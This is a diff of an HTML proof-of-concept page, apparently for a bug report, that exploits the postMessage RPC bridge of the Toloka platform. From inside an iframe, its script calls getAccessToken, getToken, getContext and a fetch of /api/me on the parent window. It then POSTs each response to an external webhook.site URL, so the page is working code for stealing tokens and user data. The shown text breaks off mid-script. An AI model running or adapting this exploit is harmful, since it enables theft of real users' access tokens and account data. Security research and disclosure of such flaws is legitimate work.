@@ -1,59 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8" />
-  <title>🧪 PoC - Toloka RPC Leak</title>
+  <meta charset="UTF-8">
+  <title>PoC - Toloka postMessage Exploit</title>
   <style>
-    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
     pre { white-space: pre-wrap; word-break: break-word; }
   </style>
 </head>
 <body>
-  <h2>📡 Toloka RPC PoC</h2>
-  <pre id="log">⏳ Running tests...</pre>
+  <h2>📡 PoC - Exploiting Toloka postMessage</h2>
+  <pre id="log">⏳ Waiting...</pre>
 
   <script>
     const logEl = document.getElementById('log');
-    const webhookURL = 'https://webhook.site/2106b9ef-aafe-498c-b8e0-bef7c35b92f3'; // ← ضع رابطك هنا
-
-    const collected = {};
-
     const log = (...args) => {
       const text = args.map(a => typeof a === 'object' ? JSON.stringify(a, null, 2) : a).join(' ');
       logEl.textContent += '\n' + text;
       console.log(...args);
     };
 
+    const webhookURL = 'https://webhook.site/2106b9ef-aafe-498c-b8e0-bef7c35b92f3';
+
     function callRPC(method, payload = {}) {
       const id = crypto.randomUUID();
-
-      window.addEventListener('message', function handler(e) {
+      
+      const handler = (e) => {
         if (e.origin !== 'https://tb.toloka.dev') return;
-        if (e.data?.id === id && e.data?.type === 'rpc') {
-          log(`✅ [${method}] response:`, e.data.payload);
-          collected[method] = e.data.payload;
-          window.removeEventListener('message', handler);
+        if (e.data?.id !== id) return;
+        if (e.data?.type !== 'rpc') return;
 
-          // إذا جمعنا كل القيم نرسلها إلى Webhook
-          if (Object.keys(collected).length === 4) {
-            fetch(webhookURL, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                time: new Date().toISOString(),
-                data: collected
-              })
-            }).then(() => log('📤 Sent to webhook ✅')).catch(e => log('❌ Webhook error:', e));
-          }
-        }
-      });
+        log(`✅ [${method}] Response:`, e.data.payload);
+        window.removeEventListener('message', handler);
 
+        // إرسال البيانات إلى Webhook
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ method, payload: e.data.payload })
+        });
+      };
+
+      window.addEventListener('message', handler);
+
+      log(`📤 Sending ${method} with id ${id}`);
       window.parent.postMessage({ type: 'rpc', id, name: method, payload }, '*');
-      log(`📤 Sent ${method} with id ${id}`);
     }
 
     window.onload = () => {
-      ['getAccessToken', 'getToken', 'getContext'].forEach(callRPC);
+      ['getAccessToken', 'getToken', 'getContext'].forEach(method => callRPC(method));
+
       callRPC('fetch', {
         url: '/api/me',
         requestInit: { method: 'GET' }
